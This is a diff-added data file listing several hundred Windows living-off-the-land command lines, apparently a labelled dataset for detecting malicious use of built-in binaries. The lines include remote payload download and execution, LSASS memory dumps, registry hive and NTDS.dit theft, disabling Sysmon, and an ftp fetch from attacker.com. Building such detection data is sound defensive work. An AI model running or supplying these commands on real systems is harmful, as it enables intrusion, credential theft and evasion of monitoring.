+bitsadmin /create 1 bitsadmin /addfile 1 https://live.sysinternals.com/autoruns.exe c:\data\playfolder\autoruns.exe bitsadmin /RESUME 1 bitsadmin /complete 1,1
+bitsadmin /create 1 & bitsadmin /addfile 1 c:\windows\system32\cmd.exe c:\data\playfolder\cmd.exe & bitsadmin /RESUME 1 & bitsadmin /Complete 1 & bitsadmin /reset,1
+bitsadmin /create 1 & bitsadmin /addfile 1 c:\windows\system32\cmd.exe c:\data\playfolder\cmd.exe & bitsadmin /SetNotifyCmdLine 1 c:\data\playfolder\cmd.exe NULL & bitsadmin /RESUME 1 & bitsadmin /Reset,1
+certoc.exe -LoadDLL {PATH_ABSOLUTE:.dll},1
+certoc.exe -GetCACAPS {REMOTEURL:.ps1},1
+CertReq -Post -config {REMOTEURL} {PATH_ABSOLUTE} {PATH:.txt},1
+CertReq -Post -config {REMOTEURL} {PATH_ABSOLUTE},1
+certutil.exe -urlcache -f {REMOTEURL:.exe} {PATH:.exe},1
+certutil.exe -verifyctl -f {REMOTEURL:.exe} {PATH:.exe},1
+certutil.exe -urlcache -f {REMOTEURL:.ps1} {PATH_ABSOLUTE}:ttt,1
+certutil.exe -URL {REMOTEURL:.exe},1
+certutil -encode {PATH} {PATH:.base64},1
+certutil -decode {PATH:.base64} {PATH},1
+certutil -decodehex {PATH:.hex} {PATH},1
+change.exe user,1
+cipher /w:{PATH_ABSOLUTE:folder},1
+cmd.exe /c echo regsvr32.exe ^/s ^/u ^/i:{REMOTEURL:.sct} ^scrobj.dll > {PATH}:payload.bat,1
+cmd.exe - < {PATH}:payload.bat,1
+type {PATH_SMB} > {PATH_ABSOLUTE},1
+type {PATH_ABSOLUTE} > {PATH_SMB},1
+cmdkey /list,1
+cmdl32 /vpn /lan %cd%\config,1
+cmstp.exe /ni /s {PATH_ABSOLUTE:.inf},1
+cmstp.exe /ni /s {REMOTEURL:.inf},1
+colorcpl {PATH},1
+ComputerDefaults.exe,1
+ConfigSecurityPolicy.exe {PATH_ABSOLUTE} {REMOTEURL},1
+ConfigSecurityPolicy.exe {REMOTEURL},1
+conhost.exe {CMD},1
+conhost.exe --headless {CMD},1
+control.exe {PATH_ABSOLUTE}:evil.dll,1
+control.exe {PATH_ABSOLUTE:.cpl},1
+csc.exe -out:{PATH:.exe} {PATH:.cs},1
+csc -target:library {PATH:.cs},1
+cscript //e:vbscript {PATH_ABSOLUTE}:script.vbs,1
+CustomShellHost.exe,1
+DataSvcUtil /out:{PATH_ABSOLUTE} /uri:{REMOTEURL},1
+"set ""SYSTEMROOT=C:\Windows\Temp"" && cmd /c desktopimgdownldr.exe /lockscreenurl:{REMOTEURL} /eventName:desktopimgdownldr",1
+DeviceCredentialDeployment,1
+"rundll32.exe dfshim.dll,ShOpenVerbApplication {REMOTEURL}",1
+diantz.exe {PATH_ABSOLUTE:.exe} {PATH_ABSOLUTE}:targetFile.cab,1
+diantz.exe {PATH_SMB:.exe} {PATH_ABSOLUTE:.cab},1
+diantz /f {PATH:.ddf},1
+diskshadow.exe /s {PATH:.txt},1
+diskshadow> exec {PATH:.exe},1
+dnscmd.exe dc1.lab.int /config /serverlevelplugindll {PATH_SMB:.dll},1
+esentutl.exe /y {PATH_ABSOLUTE:.source.vbs} /d {PATH_ABSOLUTE:.dest.vbs} /o,1
+esentutl.exe /y {PATH_ABSOLUTE:.exe} /d {PATH_ABSOLUTE}:file.exe /o,1
+esentutl.exe /y {PATH_ABSOLUTE}:file.exe /d {PATH_ABSOLUTE:.exe} /o,1
+esentutl.exe /y {PATH_SMB:.exe} /d {PATH_ABSOLUTE}:file.exe /o,1
+esentutl.exe /y {PATH_SMB:.source.exe} /d {PATH_SMB:.dest.exe} /o,1
+esentutl.exe /y /vss c:\windows\ntds\ntds.dit /d {PATH_ABSOLUTE:.dit},1
+eudcedit,1
+eventvwr.exe,1
+"ysoserial.exe -o raw -f BinaryFormatter - g DataSet -c ""{CMD}"" > RecentViews & copy RecentViews %LOCALAPPDATA%\Microsoft\EventV~1\RecentViews & eventvwr.exe",1
+expand {PATH_SMB:.bat} {PATH_ABSOLUTE:.bat},1
+expand {PATH_ABSOLUTE:.source.ext} {PATH_ABSOLUTE:.dest.ext},1
+expand {PATH_SMB:.bat} {PATH_ABSOLUTE}:file.bat,1
+"explorer.exe /root,""{PATH_ABSOLUTE:.exe}""",1
+explorer.exe {PATH_ABSOLUTE:.exe},1
+Extexport.exe {PATH_ABSOLUTE:folder} foo bar,1
+extrac32 {PATH_ABSOLUTE:.cab} {PATH_ABSOLUTE}:file.exe,1
+extrac32 /Y /C {PATH_SMB} {PATH_ABSOLUTE},1
+extrac32.exe /C {PATH_ABSOLUTE:.source.exe} {PATH_ABSOLUTE:.dest.exe},1
+findstr /V /L W3AllLov3LolBas {PATH_ABSOLUTE:.exe} > {PATH_ABSOLUTE}:file.exe,1
+findstr /V /L W3AllLov3LolBas {PATH_SMB:.exe} > {PATH_ABSOLUTE}:file.exe,1
+findstr /S /I cpassword \\sysvol\policies\*.xml,1
+findstr /V /L W3AllLov3LolBas {PATH_SMB:.exe} > {PATH_ABSOLUTE:.exe},1
+finger user@example.host.com | more +2 | cmd,1
+fltMC.exe unload SysmonDrv,1
+"forfiles /p c:\windows\system32 /m notepad.exe /c ""{CMD}""",1
+"forfiles /p c:\windows\system32 /m notepad.exe /c ""{PATH_ABSOLUTE}:evil.exe""",1
+fsutil.exe file setZeroData offset=0 length=9999999999 {PATH_ABSOLUTE},1
+fsutil.exe usn deletejournal /d c:,1
+fsutil.exe trace decode,1
+echo !{CMD} > ftpcommands.txt && ftp -s:ftpcommands.txt,1
+"cmd.exe /c ""@echo open attacker.com 21>ftp.txt&@echo USER attacker>>ftp.txt&@echo PASS PaSsWoRd>>ftp.txt&@echo binary>>ftp.txt&@echo GET /payload.exe>>ftp.txt&@echo quit>>ftp.txt&@ftp -s:ftp.txt -v""",1
+Gpscript /logon,1
+Gpscript /startup,1
+HH.exe {REMOTEURL:.bat},1
+HH.exe {PATH_ABSOLUTE:.exe},1
+HH.exe {REMOTEURL:.chm},1
+C:\Windows\System32\IME\SHARED\IMEWDBLD.exe {REMOTEURL},1
+ie4uinit.exe -BaseSettings,1
+"set windir=c:\test& cd ""C:\Program Files\Internet Explorer\"" & iediagcmd.exe /out:{PATH_ABSOLUTE:.cab}",1
+ieexec.exe {REMOTEURL:.exe},1
+ilasm.exe {PATH_ABSOLUTE:.txt} /exe,1
+ilasm.exe {PATH_ABSOLUTE:.txt} /dll,1
+InfDefaultInstall.exe {PATH:.inf},1
+InstallUtil.exe /logfile= /LogToConsole=false /U {PATH:.dll},1
+InstallUtil.exe {REMOTEURL},1
+c:\windows\syswow64\iscsicpl.exe,1
+iscsicpl.exe,1
+jsc.exe {PATH:.js},1
+jsc.exe /t:library {PATH:.js},1
+Ldifde -i -f {PATH:.ldf},1
+makecab {PATH_ABSOLUTE:.exe} {PATH_ABSOLUTE}:autoruns.cab,1
+makecab {PATH_SMB:.exe} {PATH_ABSOLUTE}:file.cab,1
+makecab {PATH_SMB:.exe} {PATH_ABSOLUTE:.cab},1
+makecab /F {PATH:.ddf},1
+MavInject.exe 3110 /INJECTRUNNING {PATH_ABSOLUTE:.dll},1
+Mavinject.exe 4172 /INJECTRUNNING {PATH_ABSOLUTE}:file.dll,1
+Microsoft.Workflow.Compiler.exe {PATH} {PATH:.log},1
+mmc.exe -Embedding {PATH_ABSOLUTE:.msc},1
+mmc.exe gpedit.msc,1
+MpCmdRun.exe -DownloadFile -url {REMOTEURL:.exe} -path {PATH_ABSOLUTE:.exe},1
+"copy ""C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.exe"" C:\Users\Public\Downloads\MP.exe && chdir ""C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\"" && ""C:\Users\Public\Downloads\MP.exe"" -DownloadFile -url {REMOTEURL:.exe} -path C:\Users\Public\Downloads\evil.exe",1
+MpCmdRun.exe -DownloadFile -url {REMOTEURL:.exe} -path {PATH_ABSOLUTE:.exe}:evil.exe,1
+msbuild.exe {PATH:.xml},1
+msbuild.exe {PATH:.csproj},1
+"msbuild.exe /logger:TargetLogger,{PATH_ABSOLUTE:.dll};MyParameters,Foo",1
+msbuild.exe {PATH:.proj},1
+msbuild.exe @{PATH:.rsp},1
+Msconfig.exe -5,1
+msdt.exe -path C:\WINDOWS\diagnostics\index\PCWDiagnostic.xml -af {PATH_ABSOLUTE:.xml} /skip TRUE,1
+"msdt.exe /id PCWDiagnostic /skip force /param ""IT_LaunchMethod=ContextMenu IT_BrowseForFile=/../../$(calc).exe""",1
+msedge.exe {REMOTEURL:.exe.txt},1
+"msedge.exe --headless --enable-logging --disable-gpu --dump-dom ""{REMOTEURL:.base64.html}"" > {PATH:.b64}",1
+"msedge.exe --disable-gpu-sandbox --gpu-launcher=""{CMD} &&""",1
+mshta.exe {PATH:.hta},1
+"mshta.exe vbscript:Close(Execute(""GetObject(""""script:{REMOTEURL:.sct}"""")""))",1
+"mshta.exe javascript:a=GetObject(""script:{REMOTEURL:.sct}"").Exec();close();",1
+"mshta.exe ""{PATH_ABSOLUTE}:file.hta""",1
+mshta.exe {REMOTEURL},1
+msiexec /quiet /i {PATH:.msi},1
+msiexec /q /i {REMOTEURL},1
+msiexec /y {PATH_ABSOLUTE:.dll},1
+msiexec /z {PATH_ABSOLUTE:.dll},1
+"msiexec /i {PATH_ABSOLUTE:.msi} TRANSFORMS=""{REMOTEURL:.mst}"" /qb",1
+netsh.exe add helper {PATH_ABSOLUTE:.dll},1
+ngen.exe {REMOTEURL},1
+odbcconf /a {REGSVR {PATH_ABSOLUTE:.dll}},1
+"odbcconf INSTALLDRIVER ""lolbas-project|Driver={PATH_ABSOLUTE:.dll}|APILevel=2"" odbcconf configsysdsn ""lolbas-project"" ""DSN=lolbas-project""",1
+odbcconf -f {PATH:.rsp},1
+OfflineScannerShell,1
+OneDriveStandaloneUpdater,1
+pcalua.exe -a {PATH:.exe},1
+pcalua.exe -a {PATH_SMB:.dll},1
+pcalua.exe -a {PATH_ABSOLUTE:.cpl} -c Java,1
+Pcwrun.exe {PATH_ABSOLUTE:.exe},1
+Pcwrun.exe /../../$(calc).exe,1
+pktmon.exe start --etw,1
+pktmon.exe filter add -p 445,1
+pnputil.exe -i -a {PATH_ABSOLUTE:.inf},1
+Presentationhost.exe {PATH_ABSOLUTE:.xbap},1
+Presentationhost.exe {REMOTEURL},1
+print /D:{PATH_ABSOLUTE}:file.exe {PATH_ABSOLUTE:.exe},1
+print /D:{PATH_ABSOLUTE:.dest.exe} {PATH_ABSOLUTE:.source.exe},1
+print /D:{PATH_ABSOLUTE:.dest.exe} {PATH_SMB:.source.exe},1
+PrintBrm -b -d {PATH_SMB:folder} -f {PATH_ABSOLUTE:.zip},1
+PrintBrm -r -f {PATH_ABSOLUTE}:hidden.zip -d {PATH_ABSOLUTE:folder},1
+provlaunch.exe LOLBin,1
+psr.exe /start /output {PATH_ABSOLUTE:.zip} /sc 1 /gui 0,1
+query.exe user,1
+rasautou -d {PATH:.dll} -p export_name -a a -e e,1
+rdrleakdiag.exe /p 940 /o {PATH_ABSOLUTE:folder} /fullmemdmp /wait 1,1
+rdrleakdiag.exe /p 832 /o {PATH_ABSOLUTE:folder} /fullmemdmp /wait 1,1
+rdrleakdiag.exe /p 832 /o {PATH_ABSOLUTE:folder} /fullmemdmp /snap,1
+reg export HKLM\SOFTWARE\Microsoft\Evilreg {PATH_ABSOLUTE}:evilreg.reg,1
+reg save HKLM\SECURITY {PATH_ABSOLUTE:.1.bak} && reg save HKLM\SYSTEM {PATH_ABSOLUTE:.2.bak} && reg save HKLM\SAM {PATH_ABSOLUTE:.3.bak},1
+regasm.exe {PATH:.dll},1
+regasm.exe /U {PATH:.dll},1
+regedit /E {PATH_ABSOLUTE}:regfile.reg HKEY_CURRENT_USER\MyCustomRegKey,1
+regedit {PATH_ABSOLUTE}:regfile.reg,1
+regini.exe {PATH}:hidden.ini,1
+Register-cimprovider -path {PATH_ABSOLUTE:.dll},1
+regsvcs.exe {PATH:.dll},1
+regsvr32 /s /n /u /i:{REMOTEURL:.sct} scrobj.dll,1
+regsvr32.exe /s /u /i:{PATH:.sct} scrobj.dll,1
+regsvr32.exe /s {PATH:.dll},1
+regsvr32.exe /u /s {PATH:.dll},1
+replace.exe {PATH_ABSOLUTE:.cab} {PATH_ABSOLUTE:folder} /A,1
+replace.exe {PATH_SMB:.exe} {PATH_ABSOLUTE:folder} /A,1
+reset.exe session,1
+rpcping -s 127.0.0.1 -e 1234 -a privacy -u NTLM,1
+rpcping /s 10.0.0.35 /e 9997 /a connect /u NTLM,1
+"rundll32.exe {PATH},EntryPoint",1
+"rundll32.exe {PATH_SMB:.dll},EntryPoint",1
+"rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();GetObject(""script:{REMOTEURL}"")",1
+"rundll32 ""{PATH}:ADSDLL.dll"",DllMain",1
+rundll32.exe -sta {CLSID},1
+runexehelper.exe {PATH_ABSOLUTE:.exe},1
+Runonce.exe /AlternateShellStartup,1
+runscripthelper.exe surfacecheck \\?\{PATH_ABSOLUTE:.txt} {PATH_ABSOLUTE:folder},1
+"sc create evilservice binPath=""\""c:\\ADS\\file.txt:cmd.exe\"" /c echo works > \""c:\ADS\works.txt\"""" DisplayName= ""evilservice"" start= auto\ & sc start evilservice",1
+"sc config {ExistingServiceName} binPath=""\""c:\\ADS\\file.txt:cmd.exe\"" /c echo works > \""c:\ADS\works.txt\"""" & sc start {ExistingServiceName}",1
+"schtasks /create /sc minute /mo 1 /tn ""Reverse shell"" /tr ""{CMD}""",1
+"schtasks /create /s targetmachine /tn ""MyTask"" /tr ""{CMD}"" /sc daily",1
+Scriptrunner.exe -appvscript {PATH:.exe},1
+ScriptRunner.exe -appvscript {PATH_SMB:.cmd},1
+setres.exe -w 800 -h 600,1
+SettingSyncHost -LoadAndRunDiagScript {PATH:.exe},1
+SettingSyncHost -LoadAndRunDiagScriptNoCab {PATH:.bat},1
+"sftp -o ProxyCommand=""{CMD}"" .",1
+"ssh localhost ""{CMD}""",1
+"ssh -o ProxyCommand=""{CMD}"" .",1
+stordiag.exe,1
+"SyncAppvPublishingServer.exe ""n;(New-Object Net.WebClient).DownloadString('{REMOTEURL:.ps1}') | IEX""",1
+tar -cf {PATH}:ads {PATH_ABSOLUTE:folder},1
+tar -xf {PATH}:ads,1
+tar -xf {PATH_SMB:.tar},1
+"TTDInject.exe /ClientParams ""7 tmp.run 0 0 0 0 0 0 0 0 0 0"" /Launch ""{PATH:.exe}""",1
+"ttdinject.exe /ClientScenario TTDRecorder /ddload 0 /ClientParams ""7 tmp.run 0 0 0 0 0 0 0 0 0 0"" /launch ""{PATH:.exe}""",1
+tttracer.exe {PATH_ABSOLUTE:.exe},1
+TTTracer.exe -dumpFull -attach {PID},1
+"rmdir %temp%\lolbin /s /q 2>nul & mkdir ""%temp%\lolbin\Windows Media Player"" & copy C:\Windows\System32\calc.exe ""%temp%\lolbin\Windows Media Player\wmpnscfg.exe"" >nul && cmd /V /C ""set ""ProgramW6432=%temp%\lolbin"" && unregmp2.exe /HideWMP""",1
+vbc.exe /target:exe {PATH_ABSOLUTE:.vb},1
+vbc -reference:Microsoft.VisualBasic.dll {PATH_ABSOLUTE:.vb},1
+verclsid.exe /S /C {CLSID},1
+wab.exe,1
+"wbadmin start backup -backupTarget:{PATH_ABSOLUTE:folder} -include:C:\Windows\NTDS\NTDS.dit,C:\Windows\System32\config\SYSTEM -quiet",1
+"wbadmin start recovery -version:<VERSIONIDENTIFIER> -recoverytarget:{PATH_ABSOLUTE:folder} -itemtype:file -items:C:\Windows\NTDS\NTDS.dit,C:\Windows\System32\config\SYSTEM -notRestoreAcl -quiet",1
+wbemtest.exe,1
+winget.exe install --manifest {PATH:.yml},1
+winget.exe install --accept-package-agreements -s msstore {name or ID},1
+wlrmdr.exe -s 3600 -f 0 -t _ -m _ -a 11 -u {PATH:.exe},1
+"wmic.exe process call create ""{PATH_ABSOLUTE}:program.exe""",1
+"wmic.exe process call create ""{CMD}""",1
+"wmic.exe /node:""192.168.0.1"" process call create ""{CMD}""",1
+"wmic.exe process get brief /format:""{REMOTEURL:.xsl}""",1
+"wmic.exe process get brief /format:""{PATH_SMB:.xsl}""",1
+"wmic.exe datafile where ""Name='C:\\windows\\system32\\calc.exe'"" call Copy ""C:\\users\\public\\calc.exe""",1
+WorkFolders,1
+wscript //e:vbscript {PATH}:script.vbs,1
+"echo GetObject(""script:{REMOTEURL:.js}"") > {PATH_ABSOLUTE}:hi.js && wscript.exe {PATH_ABSOLUTE}:hi.js",1
+wsreset.exe,1
+wuauclt.exe /UpdateDeploymentProvider {PATH_ABSOLUTE:.dll} /RunHandlerComServer,1
+xwizard RunWizard {00000001-0000-0000-0000-0000FEEDACDC},1
+xwizard RunWizard /taero /u {00000001-0000-0000-0000-0000FEEDACDC},1
+xwizard RunWizard {7940acf8-60ba-4213-a7c3-f3b400ee266d} /z{REMOTEURL},1
+C:\Program Files (x86)\Microsoft\Edge\Application\msedge_proxy.exe {REMOTEURL:.zip},1
+"C:\Program Files (x86)\Microsoft\Edge\Application\msedge_proxy.exe --disable-gpu-sandbox --gpu-launcher=""{CMD} &&""",1
+"msedgewebview2.exe --no-sandbox --browser-subprocess-path=""{PATH_ABSOLUTE:.exe}""",1
+"msedgewebview2.exe --utility-cmd-prefix=""{CMD}""",1
+"msedgewebview2.exe --disable-gpu-sandbox --gpu-launcher=""{CMD}""",1
+"msedgewebview2.exe --no-sandbox --renderer-cmd-prefix=""{CMD}""",1
+wt.exe {CMD},1
+"rundll32.exe advpack.dll,LaunchINFSection {PATH:.inf},DefaultInstall_SingleUser,1,",1
+"rundll32.exe advpack.dll,LaunchINFSection {PATH:.inf},,1,",1
+"rundll32.exe advpack.dll,RegisterOCX {PATH:.dll}",1
+"rundll32.exe advpack.dll,RegisterOCX {PATH:.exe}",1
+"rundll32 advpack.dll, RegisterOCX {CMD}",1
+"rundll32.exe desk.cpl,InstallScreenSaver {PATH_ABSOLUTE:.scr}",1
+"rundll32.exe desk.cpl,InstallScreenSaver {PATH_SMB:.scr}",1
+"rundll32.exe ieadvpack.dll,LaunchINFSection {PATH_ABSOLUTE:.inf},DefaultInstall_SingleUser,1,",1
+"rundll32.exe ieadvpack.dll,LaunchINFSection {PATH_ABSOLUTE:.inf},,1,",1
+"rundll32.exe ieadvpack.dll,RegisterOCX {PATH:.dll}",1
+"rundll32.exe ieadvpack.dll,RegisterOCX {PATH:.exe}",1
+"rundll32 ieadvpack.dll, RegisterOCX {CMD}",1
+"rundll32.exe ieframe.dll,OpenURL {PATH_ABSOLUTE:.url}",1
+"rundll32.exe Mshtml.dll,PrintHTML {PATH_ABSOLUTE:.hta}",1
+"rundll32.exe pcwutl.dll,LaunchApplication {PATH:.exe}",1
+"rundll32.exe ""C:\Program Files\Windows Photo Viewer\PhotoViewer.dll"",ImageView_Fullscreen {REMOTEURL}",1
+"rundll32.exe C:\Windows\System32\scrobj.dll,GenerateTypeLib {REMOTEURL:.exe}",1
+"rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 {PATH_ABSOLUTE:.inf}",1
+"rundll32.exe shdocvw.dll,OpenURL {PATH_ABSOLUTE:.url}",1
+"rundll32.exe shell32.dll,Control_RunDLL {PATH_ABSOLUTE:.dll}",1
+"rundll32.exe shell32.dll,ShellExec_RunDLL {PATH:.exe}",1
+"rundll32 SHELL32.DLL,ShellExec_RunDLL {PATH:.exe} {CMD:args}",1
+"rundll32.exe shell32.dll,#44 {PATH:.dll}",1
+"rundll32.exe c:\Windows\System32\shimgvw.dll,ImageView_Fullscreen {REMOTEURL:.exe}",1
+"rundll32 syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 {PATH_ABSOLUTE:.inf}",1
+"rundll32.exe url.dll,OpenURL {PATH_ABSOLUTE:.hta}",1
+"rundll32.exe url.dll,OpenURL {PATH_ABSOLUTE:.url}",1
+"rundll32.exe url.dll,OpenURL file://^C^:^/^W^i^n^d^o^w^s^/^s^y^s^t^e^m^3^2^/^c^a^l^c^.^e^x^e",1
+"rundll32.exe url.dll,FileProtocolHandler {PATH_ABSOLUTE:.exe}",1
+"rundll32.exe url.dll,FileProtocolHandler file://^C^:^/^W^i^n^d^o^w^s^/^s^y^s^t^e^m^3^2^/^c^a^l^c^.^e^x^e",1
+"rundll32.exe url.dll,FileProtocolHandler file:///C:/test/test.hta",1
+"rundll32.exe zipfldr.dll,RouteTheCall {PATH:.exe}",1
+"rundll32.exe zipfldr.dll,RouteTheCall file://^C^:^/^W^i^n^d^o^w^s^/^s^y^s^t^e^m^3^2^/^c^a^l^c^.^e^x^e",1
+rundll32 C:\windows\system32\comsvcs.dll MiniDump {LSASS_PID} dump.bin full,1
+"AccCheckConsole.exe -window ""Untitled - Notepad"" {PATH_ABSOLUTE:.dll}",1
+adplus.exe -hang -pn lsass.exe -o {PATH_ABSOLUTE:folder} -quiet,1
+adplus.exe -c {PATH:.xml},1
+"adplus.exe -crash -o ""{PATH_ABSOLUTE:folder}"" -sc {PATH:.exe}",1
+"AgentExecutor.exe -powershell ""{PATH_ABSOLUTE:.ps1}"" ""{PATH_ABSOLUTE:.1.log}"" ""{PATH_ABSOLUTE:.2.log}"" ""{PATH_ABSOLUTE:.3.log}"" 60000 ""C:\Windows\SysWOW64\WindowsPowerShell\v1.0"" 0 1",1
+"AgentExecutor.exe -powershell ""{PATH_ABSOLUTE:.ps1}"" ""{PATH_ABSOLUTE:.1.log}"" ""{PATH_ABSOLUTE:.2.log}"" ""{PATH_ABSOLUTE:.3.log}"" 60000 ""{PATH_ABSOLUTE:folder}"" 0 1",1
+AppLauncher.exe {PATH_ABSOLUTE:.exe},1
+appcert.exe test -apptype desktop -setuppath {PATH_ABSOLUTE:.exe} -reportoutputpath {PATH_ABSOLUTE:.xml},1
+appcert.exe test -apptype desktop -setuppath {PATH_ABSOLUTE:.msi} -setupcommandline /q -reportoutputpath {PATH_ABSOLUTE:.xml},1
+AppVLP.exe {PATH_SMB:.bat},1
+"AppVLP.exe powershell.exe -c ""$e=New-Object -ComObject shell.application;$e.ShellExecute('{PATH:.exe}','', '', 'open', 1)""",1
+"bcp ""SELECT payload_data FROM database.dbo.payloads WHERE id=1"" queryout ""C:\Windows\Temp\payload.exe"" -S localhost -T -c",1
+bginfo.exe {PATH:.bgi} /popup /nolicprompt,1
+\\10.10.10.10\webdav\bginfo.exe {PATH:.bgi} /popup /nolicprompt,1
+\\live.sysinternals.com\Tools\bginfo.exe {PATH_SMB:.bgi} /popup /nolicprompt,1
+cdb.exe -cf {PATH:.wds} -o notepad.exe,1
+cdb.exe -pd -pn {process_name} .shell {CMD},1
+"cdb.exe -c {PATH:.txt} ""{CMD}""",1
+coregen.exe /L {PATH_ABSOLUTE:.dll} dummy_assembly_name,1
+coregen.exe dummy_assembly_name,1
+createdump.exe -n -f {PATH:.dmp} {PID},1
+csi.exe {PATH:.cs},1
+"DefaultPack.EXE /C:""{CMD}""",1
+devinit.exe run -t msi-install -i {REMOTEURL:.msi},1
+"devtoolslauncher.exe LaunchForDeploy {PATH_ABSOLUTE:.exe} ""{CMD:args}"" test",1
+"devtoolslauncher.exe LaunchForDebug {PATH_ABSOLUTE:.exe} ""{CMD:args}"" test",1
+dnx.exe {PATH_ABSOLUTE:folder},1
+dotnet.exe {PATH:.dll},1
+dotnet.exe fsi,1
+dotnet.exe msbuild {PATH:.csproj},1
+"dsdbutil.exe ""activate instance ntds"" ""snapshot"" ""create"" ""quit"" ""quit""",1
+"dsdbutil.exe ""activate instance ntds"" ""snapshot"" ""mount {GUID}"" ""quit"" ""quit""",1
+"dsdbutil.exe ""activate instance ntds"" ""snapshot"" ""delete {GUID}"" ""quit"" ""quit""",1
+"dsdbutil.exe ""activate instance ntds"" ""snapshot"" ""create"" ""list all"" ""mount 1"" ""quit"" ""quit""",1
+"dsdbutil.exe ""activate instance ntds"" ""snapshot"" ""list all"" ""delete 1"" ""quit"" ""quit""",1
+dtutil.exe /FILE {PATH_ABSOLUTE:.source.ext} /COPY FILE;{PATH_ABSOLUTE:.dest.ext},1
+dump64.exe {PID} out.dmp,1
+DumpMinitool.exe --file {PATH_ABSOLUTE} --processId 1132 --dumpType Full,1
+Dxcap.exe -c {PATH_ABSOLUTE:.exe},1
+ECMangen.exe {REMOTEURL},1
+Excel.exe {REMOTEURL},1
+fsi.exe {PATH:.fsscript},1
+fsi.exe,1
+fsianycpu.exe {PATH:.fsscript},1
+fsianycpu.exe,1
+"IntelliTrace.exe launch /cp:""collectionplan.xml"" /f:""c:\users\public\log"" ""C:\Windows\System32\calc.exe""",1
+Mftrace.exe {PATH:.exe},1
+Microsoft.NodejsTools.PressAnyKey.exe normal 1 {PATH:.exe},1
+mpiexec.exe {CMD},1
+MSAccess.exe {REMOTEURL},1
+"msdeploy.exe -verb:sync -source:RunCommand -dest:runCommand=""{PATH_ABSOLUTE:.bat}""",1
+msdeploy.exe -verb:sync -source:filePath={PATH_ABSOLUTE:.source.ext} -dest:filePath={PATH_ABSOLUTE:.dest.ext},1
+MsoHtmEd.exe {REMOTEURL},1
+mspub.exe {REMOTEURL},1
+msxsl.exe {PATH:.xml} {PATH:.xsl},1
+msxsl.exe {REMOTEURL:.xml} {REMOTEURL:.xsl},1
+msxsl.exe {REMOTEURL:.xml} {REMOTEURL:.xml},1
+msxsl.exe {REMOTEURL:.xml} {REMOTEURL:.xsl} -o {PATH},1
+msxsl.exe {REMOTEURL:.xml} {REMOTEURL:.xsl} -o {PATH}:ads-name,1
+"ntdsutil.exe ""ac i ntds"" ""ifm"" ""create full c:\"" q q",1
+ntsd.exe -g {CMD},1
+OpenConsole.exe {PATH:.exe},1
+pixtool.exe launch {PATH_ABSOLUTE:.exe},1
+Powerpnt.exe {REMOTEURL},1
+procdump.exe -md {PATH:.dll} explorer.exe,1
+procdump.exe -md {PATH:.dll} foobar,1
+ProtocolHandler.exe {REMOTEURL},1
+rcsi.exe {PATH:.csx},1
+Remote.exe /s {PATH:.exe} anythinghere,1
+Remote.exe /s {PATH_SMB:.exe} anythinghere,1
+sqldumper.exe 464 0 0x0110,1
+sqldumper.exe 540 0 0x01100:40,1
+Sqlps.exe -noprofile,1
+SQLToolsPS.exe -noprofile -command Start-Process {PATH:.exe},1
+squirrel.exe --download {REMOTEURL},1
+squirrel.exe --update {REMOTEURL},1
+squirrel.exe --updateRollback={REMOTEURL},1
+te.exe {PATH:.wsc},1
+te.exe {PATH:.dll},1
+teams.exe,1
+"teams.exe --disable-gpu-sandbox --gpu-launcher=""{CMD} &&""",1
+TestWindowRemoteAgent.exe start -h {your-base64-data}.example.com -p 8000,1
+Tracker.exe /d {PATH:.dll} /c C:\Windows\write.exe,1
+Update.exe --download {REMOTEURL},1
+Update.exe --update={REMOTEURL},1
+Update.exe --update={PATH_SMB:folder},1
+Update.exe --updateRollback={REMOTEURL},1
+"Update.exe --processStart {PATH:.exe} --process-start-args ""{CMD:args}""",1
+Update.exe --updateRollback={PATH_SMB:folder},1
+Update.exe --createShortcut={PATH:.exe} -l=Startup,1
+Update.exe --removeShortcut={PATH:.exe}-l=Startup,1
+VSDiagnostics.exe start 1 /launch:{PATH:.exe},1
+"VSDiagnostics.exe start 2 /launch:{PATH:.exe} /launchArgs:""{CMD:args}""",1
+"VSIISExeLauncher.exe -p {PATH:.exe} -a ""{CMD:args}""",1
+Visio.exe {REMOTEURL},1
+VisualUiaVerifyNative.exe,1
+VSLaunchBrowser.exe .exe {REMOTEURL:.exe},1
+VSLaunchBrowser.exe .exe {PATH_ABSOLUTE:.exe},1
+VSLaunchBrowser.exe .exe {PATH_SMB},1
+vshadow.exe -nw -exec={PATH_ABSOLUTE:.exe} C:,1
+Vsjitdebugger.exe {PATH:.exe},1
+WFMFormat.exe,1
+wfc.exe {PATH_ABSOLUTE:.xoml},1
+windbg.exe -g {CMD},1
+WinProj.exe {REMOTEURL},1
+winword.exe {REMOTEURL},1
+wsl.exe -e /mnt/c/Windows/System32/calc.exe,1
+wsl.exe -u root -e cat /etc/shadow,1
+"wsl.exe --exec bash -c ""{CMD}""",1
+wsl.exe --exec bash -c 'cat < /dev/tcp/192.168.1.10/54 > binary',1
+wsl.exe,1
+"xbootmgr.exe -trace ""{boot|hibernate|standby|shutdown|rebootCycle}"" -callBack {PATH:.exe}",1
+"xbootmgr.exe -trace ""{boot|hibernate|standby|shutdown|rebootCycle}"" -preTraceCmd {PATH:.exe}",1
+xbootmgrsleep.exe 1000 {PATH:.exe},1
+devtunnel.exe host -p 8080,1
+vsls-agent.exe --agentExtensionPath {PATH_ABSOLUTE:.dll},1
+vstest.console.exe {PATH:.dll},1
+winfile.exe {PATH:.exe},1
+xsd.exe {REMOTEURL},1
+"powershell.exe -ep bypass -command ""set-location -path C:\Windows\diagnostics\system\Audio; import-module .\CL_LoadAssembly.ps1; LoadAssemblyFromPath ..\..\..\..\testing\fun.dll;[Program]::Fun()""",1
+. C:\Windows\diagnostics\system\AERO\CL_Mutexverifiers.ps1 \nrunAfterCancelProcess {PATH:.ps1},1
+. C:\Windows\diagnostics\system\AERO\CL_Invocation.ps1 \nSyncInvoke {CMD},1
+powershell -ep RemoteSigned -f .\Launch-VsDevShell.ps1 -VsWherePath {PATH_ABSOLUTE:.exe},1
+"powershell -ep RemoteSigned -f .\Launch-VsDevShell.ps1 -VsInstallationPath ""/../../../../../; {PATH:.exe} ;""",1
+set comspec={PATH_ABSOLUTE:.exe} & cscript c:\windows\system32\manage-bde.wsf,1
